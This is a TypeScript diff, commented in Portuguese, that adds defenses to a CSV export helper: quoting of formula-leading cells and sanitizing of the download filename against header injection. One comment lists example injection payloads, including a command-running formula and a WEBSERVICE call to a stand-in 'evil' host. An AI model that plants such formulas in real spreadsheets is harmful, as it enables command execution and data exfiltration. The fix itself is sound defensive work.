@@ -28,9 +28,19 @@ function formatCell(value: unknown): string {
   return String(value)
 }
 
+// Caracteres que iniciam fórmula em Excel/Sheets/LibreOffice. Se uma célula
+// começa com qualquer um, o spreadsheet pode executar a "fórmula" — vetor de
+// command injection (=cmd|/c calc!A1, =HYPERLINK("evil")), data exfiltration
+// (=WEBSERVICE("https://evil")) etc.
+const CSV_FORMULA_TRIGGERS = /^[=+\-@\t\r]/
+
 function escapeCell(value: unknown): string {
-  const raw = formatCell(value)
+  let raw = formatCell(value)
   if (raw === "") return ""
+  // Defesa contra CSV/formula injection — prefixa célula suspeita com aspa simples.
+  if (CSV_FORMULA_TRIGGERS.test(raw)) {
+    raw = `'${raw}`
+  }
   if (
     raw.includes(";") ||
     raw.includes('"') ||
@@ -66,11 +76,19 @@ export function csvFilename(prefix: string, date: Date = new Date()): string {
 
 /**
  * Headers padrao para responder com CSV.
+ *
+ * Filename é sanitizado para impedir header injection (CRLF) e duplo-quote
+ * que quebra o parsing. Usa `filename*=UTF-8''...` (RFC 5987/6266) para
+ * suportar acentos/símbolos sem quebrar quotes.
  */
 export function csvResponseHeaders(filename: string): HeadersInit {
+  const safeAscii = filename
+    .replace(/[\r\n"\\;]/g, "_")
+    .replace(/[^\x20-\x7E]/g, "_")
+  const encoded = encodeURIComponent(filename)
   return {
     "Content-Type": "text/csv; charset=utf-8",
-    "Content-Disposition": `attachment; filename="${filename}"`,
+    "Content-Disposition": `attachment; filename="${safeAscii}"; filename*=UTF-8''${encoded}`,
     "Cache-Control": "no-store",
   }
 }
